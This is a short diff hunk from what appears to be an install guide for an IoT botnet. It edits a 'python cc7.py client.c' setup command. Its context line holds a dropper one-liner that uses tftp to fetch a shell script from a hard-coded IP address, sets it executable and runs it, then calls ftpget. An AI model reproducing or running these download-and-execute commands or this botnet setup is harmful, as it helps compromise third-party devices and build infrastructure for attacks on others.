@@ -132,7 +132,7 @@ tftp -r tftp1.sh -g 94.177.230.28; chmod 777 tftp1.sh; sh tftp1.sh; ftpget -v -u
  ignore the warnings its just telling you that its going to port fowward using telnet-RAW
  
  
- python cc7.py cc7.py client.c (PUT SERVERS IP HERE)
+ python cc7.py client.c (PUT SERVERS IP HERE)
  THIS WILL TAKE ABOUT 10 mins to install
  
  
